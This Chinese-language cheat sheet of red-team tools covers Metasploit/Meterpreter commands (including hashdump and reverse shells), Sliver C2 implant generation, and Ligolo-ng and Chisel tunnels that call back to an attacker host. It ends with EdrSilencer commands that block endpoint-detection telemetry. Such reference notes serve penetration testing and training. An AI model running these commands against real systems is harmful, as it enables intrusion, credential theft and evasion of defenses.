# Metasploit Framework 工具笔记

> **难度：** ★★★☆☆ | **用途：** 漏洞利用框架
> 
> 最后更新：2026-05-14

---

## 基本工作流

```bash
msfconsole
search <关键词>
use <exploit/module>
show options
set RHOSTS <target>
set LHOST <attacker>
exploit
```

## Meterpreter 常用命令

```
sysinfo                    # 系统信息
getuid                     # 当前用户
hashdump                   # 密码 hash
ps                         # 进程列表
migrate <pid>              # 迁移进程
download <file>            # 下载文件
upload <file>              # 上传文件
shell                      # 获取系统 shell
background                 # 后台运行会话
```

## Payload 选择

| Payload | 场景 |
|---------|------|
| `windows/x64/meterpreter/reverse_tcp` | 常见反弹 shell |
| `windows/x64/meterpreter/reverse_https` | HTTPS 加密 |
| `java/jsp_shell_reverse_tcp` | Java Web Shell |
| `python/meterpreter/reverse_tcp` | Python 反弹 |

## C2 框架 — Sliver

```bash
# 生成 implant
sliver> generate --mtls <IP> --os windows --arch amd64

# 监听
sliver> mtls --lport 8443

# 交互
sliver> sessions
sliver> use <session-id>
```

**高级功能：** WASM 支持、域前置、DNS 隧道、内存规避、持久化

## 隧道代理工具

### Ligolo-ng
```bash
# 代理端
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
# 目标端
.\agent.exe -ignore-cert -connect <attacker>:11601
# 配置 tun
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip route add 10.10.10.0/24 dev ligolo
```

### Chisel
```bash
# 服务端
chisel server --reverse --port 8080 --auth user:password
# 客户端 — 反向 SOCKS5
chisel client --auth user:password 10.10.10.2:8080 R:socks
```

## EdrSilencer（EDR 流量阻断）

```bash
EdrSilencer.exe --list              # 列出 EDR 进程
EdrSilencer.exe --block-all         # 阻断所有 EDR 通信
EdrSilencer.exe --block --process MsSense.exe
EdrSilencer.exe --unblock-all       # 恢复
```

**原理：** WFP 过滤器阻断 EDR 与云端通信，使 EDR "失明"

---

_→ 参见 [`attacks/network-attacks.md`](../attacks/network-attacks.md) 获取横向移动_
